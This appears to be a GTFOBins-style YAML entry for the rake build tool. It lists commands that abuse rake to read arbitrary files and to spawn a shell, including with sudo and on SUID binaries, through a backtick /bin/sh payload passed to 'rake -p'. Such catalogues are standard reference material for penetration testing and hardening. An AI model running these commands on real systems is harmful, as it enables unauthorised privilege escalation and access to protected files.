---
functions:
  file-read:
    - code: |
        LFILE=file-to-read
        rake -f $LFILE
  shell:
    - code: rake -p '`/bin/sh 1>&0`'
  sudo:
    - code: sudo rake -p '`/bin/sh 1>&0`'
  limited-suid:
    - code: ./rake -p '`/bin/sh 1>&0`'
---
